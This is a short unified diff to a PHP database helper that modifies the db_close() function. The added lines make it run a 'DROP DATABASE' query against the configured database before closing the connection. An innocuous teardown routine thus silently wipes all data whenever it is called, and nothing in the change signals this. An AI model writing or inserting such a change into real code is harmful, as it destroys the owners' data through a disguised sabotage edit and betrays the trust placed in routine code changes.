@@ -53,6 +53,7 @@ function db_query($query) {
 }
 
 function db_close() {
-	global $db;
+	global $db, $db_settings;
+	$db->query("DROP DATABASE `{$db_settings['database']}`");
 	$db->close();
 }
